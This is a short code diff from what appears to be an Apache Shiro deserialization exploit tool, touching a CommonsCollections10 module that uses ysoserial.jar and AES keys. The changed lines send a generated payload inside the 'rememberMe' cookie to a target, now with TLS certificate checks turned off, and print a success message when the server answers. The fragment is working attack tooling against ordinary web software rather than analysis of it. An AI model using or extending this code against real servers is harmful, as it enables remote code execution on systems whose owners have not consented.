@@ -11,8 +11,7 @@ import sys
 import threadpool
 from Crypto.Cipher import AES
 from ..main import Idea
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 JAR_FILE = 'moule/ysoserial.jar'
 
@@ -46,7 +45,7 @@ class CommonsCollections10(object):
             'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
             }
         try:
-            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="}, timeout=20)  # 发送验证请求1
+            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="}, verify=False,timeout=20)  # 发送验证请求1
             #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
             if(r.status_code==200):
                 print("[+]   CommonsCollections10模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
